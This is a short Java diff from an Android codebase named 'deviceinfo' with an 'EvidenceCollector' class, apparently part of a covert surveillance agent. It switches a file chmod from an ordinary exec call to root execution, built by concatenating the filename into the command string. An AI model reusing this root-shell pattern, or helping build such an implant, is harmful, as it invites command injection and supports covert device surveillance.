@@ -23,6 +23,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Execute;
 
 /**
  * The Class AutoFlashFile.
@@ -421,13 +422,7 @@ public final class AutoFile {
 	}
 
 	public void chmod(int perm) {
-		try {
-			Runtime.getRuntime().exec( "chmod " + perm + " " + getFilename() );
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (chmod) Error: " + e);
-			}
-		}
+		Execute.executeRoot("chmod " + perm + " " + getFilename() );
 	}
 
 }
